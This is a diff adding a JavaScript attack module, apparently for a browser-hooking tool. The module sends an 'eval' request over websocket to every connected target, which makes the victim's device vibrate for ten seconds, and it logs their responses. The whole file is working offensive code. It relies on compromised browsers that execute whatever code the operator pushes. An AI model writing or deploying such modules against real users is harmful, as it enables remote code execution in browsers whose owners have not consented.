@@ -1,0 +1,25 @@
+exports.data = {
+	//info about the module
+	info: function(step /*optional */) {
+		console.log("Injects a vibrate");
+		console.log("Type exec to send the payload");
+	},
+
+	//handler for parsing responses
+	handler: function(options, connection, obj) {
+		if ("vibrate" in obj) {
+			console.log("");
+			console.log('['+connection.name+'] VIBRATE:'+obj.vibrate);
+		}
+	},
+
+	//execute the attack
+	exec: function(options,targets,step /* optional */) {
+		var payload = "send(window.navigator.vibrate([10000]))";
+		for (var i in targets) {
+			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }));
+		}
+		console.log('Payload sent')
+	}
+};
+
